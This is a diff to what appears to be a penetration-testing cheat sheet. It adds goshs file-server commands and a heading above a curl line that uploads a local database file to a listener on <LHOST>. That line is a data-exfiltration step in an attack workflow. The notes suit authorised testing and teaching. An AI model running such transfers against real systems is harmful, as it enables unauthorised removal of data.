@@ -3359,6 +3359,16 @@ $ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
 
 ## goshs
 
+### Common Commands
+
+```c
+$ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/
+$ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -b <USERNAME>:<PASSWORD>
+$ goshs -i <LHOST> -p <LPORT> -d /PATH/TO/DIRECTORY/ -si -b <USERNAME>:<PASSWORD>
+```
+
+### Copy File to the Server
+
 ```c
 $ curl -F database=@./database.db -u <USERNAME>:<PASSWORD> http://<LHOST>/upload
 ```
